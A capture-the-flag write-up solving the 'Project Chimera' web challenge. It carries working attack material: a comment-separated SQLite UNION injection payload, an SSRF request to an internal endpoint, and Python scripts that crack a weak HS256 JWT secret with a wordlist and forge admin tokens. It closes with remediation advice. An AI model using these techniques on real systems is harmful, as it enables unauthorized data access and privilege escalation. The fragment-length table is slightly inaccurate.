# Project Chimera Writeup

Solved by Aayush Upadhyay

## Flag

SPECTRONA{e903aecd01b6328ffe3da147e3a166b9c7fefbc438c51bc59e15e8926b8f7f5e}

## Challenge Overview

Category: Web Security / JWT Authentication

Target: https://spectrona.in/

Challenge pages: /chimera/phantom-route, /chimera/broken-oracle, /chimera/source-zero

The flag is assembled from three fragments in this order: staff directory SQLi fragment, media fetcher fragment, then JWT admin fragment. Each source returned a value wrapped in a 1/3SPECTRONA{...} response string. The hexadecimal contents from each response are concatenated in that order.

## Prerequisites

Base API URL:

```bash
BASE='https://spectrona.in/api/chimera'
```

## Solution Steps

### Step 1: Staff Directory - Whitespace Filtered SQL Injection

The directory accepts a role field and returns role_name and description. A normal lookup confirms the API format:

```bash
jq -nc --arg role 'guest' '{role:$role}' |
  curl -skS "$BASE/vault/search" \
    -H 'Content-Type: application/json' \
    --data-binary @- | jq .
```

A quote in the role value produced a SQLite syntax error. The challenge clue that the firewall is "allergic to empty space" indicated that ordinary SQL spaces were filtered. SQLite block comments can separate tokens in place of whitespace, so SQL keywords were joined with /**/.

First, confirm the injection and the two-column output with the SQLite version:

```bash
jq -nc --arg role "'/**/UNION/**/SELECT/**/'probe',sqlite_version()--" \
  '{role:$role}' |
  curl -skS "$BASE/vault/search" \
    -H 'Content-Type: application/json' \
    --data-binary @- | jq .
```

The response exposed SQLite 3.50.2. The query returns two columns, which made UNION SELECT suitable for reading the challenge table. The relevant schema contained secret_users(username, fragment). Query that table:

```bash
ROLE="'/**/UNION/**/SELECT/**/username,fragment/**/FROM/**/secret_users--"
jq -nc --arg role "$ROLE" '{role:$role}' |
  curl -skS "$BASE/vault/search" \
    -H 'Content-Type: application/json' \
    --data-binary @- | jq -r '.data.description'
```

The server returned:

1/3SPECTRONA{e903aecd01b6328ffe3da}

The database also contained ordinary ctf_roles rows and a secret_users row for admin. The recovered fragment value above is the useful result.

### Step 2: Media Fetcher - Request the Internal Fragment Route

The media fetch endpoint takes a URL, fetches it server-side, and returns the response body. The internal route was blocked when accessed directly, but the proxy could fetch it on behalf of the client:

```bash
URL='https://spectrona.in/api/chimera/proxy/internal-fragment'
jq -nc --arg url "$URL" '{url:$url}' |
  curl -skS "$BASE/proxy/fetch" \
    -H 'Content-Type: application/json' \
    --data-binary @- | jq .
```

To print just the returned fragment:

```bash
jq -nc --arg url "$URL" '{url:$url}' |
  curl -skS "$BASE/proxy/fetch" \
    -H 'Content-Type: application/json' \
    --data-binary @- | jq -r '.data.fragment'
```

The media API returned:

1/3SPECTRONA{147e3a166b9c7fefbc438}

This is a server-side request forgery (SSRF): the public fetcher accepted an internal API URL and returned its content.

### Step 3: Admin Portal - Recover the Weak HS256 Key and Forge an Admin JWT

The token endpoint issues a guest token:

```bash
curl -skS "$BASE/signature/forge" \
  -H 'Content-Type: application/json' \
  --data '{"action":"get_token"}' \
  | tee chimera-guest.json | jq .
```

The token is a three-part JWT. Its header declared HS256. The payload contained user: guest, role: guest, and an issued-at claim. Since HS256 is a shared-secret MAC, the known valid token can be used to test candidate keys offline.

Install or extract the standard rockyou.txt wordlist if needed:

```bash
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

Create crack_chimera_jwt.py to compare each candidate HMAC-SHA256 to the JWT signature:

```python
import base64
import hashlib
import hmac
import json

with open('chimera-guest.json', encoding='utf-8') as f:
    token = json.load(f)['token']

header, payload, signature = token.split('.')
signed_data = f'{header}.{payload}'.encode()
expected = base64.urlsafe_b64decode(signature + '=' * (-len(signature) % 4))

with open('/usr/share/wordlists/rockyou.txt', 'rb') as wordlist:
    for raw_candidate in wordlist:
        candidate = raw_candidate.rstrip(b'\r\n')
        actual = hmac.new(candidate, signed_data, hashlib.sha256).digest()
        if hmac.compare_digest(actual, expected):
            print(candidate.decode(errors='replace'))
            break
    else:
        print('No matching key in this wordlist')
```

Run the script:

```bash
python3 crack_chimera_jwt.py
```

The recovered signing secret was:

kela

This is offline recovery of a weak HS256 secret from a known token and a candidate wordlist.

### Forge a Token with Admin Claims

Create forge_chimera_admin.py:

```python
import base64
import hashlib
import hmac
import json

with open('chimera-guest.json', encoding='utf-8') as f:
    original = json.load(f)['token']

header_part, payload_part, _ = original.split('.')

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def decode_part(part: str) -> dict:
    padded = part + '=' * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))

header = decode_part(header_part)
payload = decode_part(payload_part)
payload['user'] = 'admin'
payload['role'] = 'admin'

new_header = b64url(json.dumps(header, separators=(',', ':')).encode())
new_payload = b64url(json.dumps(payload, separators=(',', ':')).encode())
signed_data = f'{new_header}.{new_payload}'.encode()
signature = b64url(hmac.new(b'kela', signed_data, hashlib.sha256).digest())
admin_token = f'{new_header}.{new_payload}.{signature}'

with open('chimera-admin.jwt', 'w', encoding='ascii') as f:
    f.write(admin_token)
print('chimera-admin.jwt')
```

Create the admin token:

```bash
python3 forge_chimera_admin.py
```

The script reuses the server-issued header and payload, changes user and role to admin, and signs the new header and payload with kela.

### Verify and Retrieve the JWT Fragment

Submit the signed JWT to the verification action:

```bash
TOKEN="$(cat chimera-admin.jwt)"
jq -nc --arg token "$TOKEN" '{action:"verify",token:$token}' |
  curl -skS "$BASE/signature/forge" \
    -H 'Content-Type: application/json' \
    --data-binary @- | jq .
```

The server confirmed admin access and returned:

```json
{
  "status": "verified",
  "message": "Admin privileges confirmed. Access granted.",
  "fragment": "1/3SPECTRONA{c51bc59e15e8926b8f7f5e}"
}
```

### Step 4: Assemble the Master Sequence

Use the hexadecimal contents of each stage response in this order:

| Source | Hex Fragment | Length |
|--------|--------------|--------|
| Staff Directory SQLi (secret_users.fragment) | e903aecd01b6328ffe3da | 22 |
| Media Fetcher (internal fragment endpoint) | 147e3a166b9c7fefbc438 | 21 |
| Admin JWT verification | c51bc59e15e8926b8f7f5e | 21 |
| Combined | e903aecd01b6328ffe3da147e3a166b9c7fefbc438c51bc59e15e8926b8f7f5e | 64 |

The result is 64 hexadecimal characters:

SPECTRONA{e903aecd01b6328ffe3da147e3a166b9c7fefbc438c51bc59e15e8926b8f7f5e}

## Security Analysis

- The staff search interpolated user input into a SQLite query and relied on whitespace filtering instead of parameterized SQL
- The media proxy accepted user-controlled URLs and allowed requests to internal API paths
- The JWT service used a guessable HS256 key, allowing anyone who obtained a valid guest token to recover the key offline and sign elevated claims

For production applications:
- Parameterize database queries
- Restrict outbound fetches with strict destination and redirect validation
- Use a high-entropy JWT secret stored outside the codebase
- Enforce authorization server-side after signature and claim validation
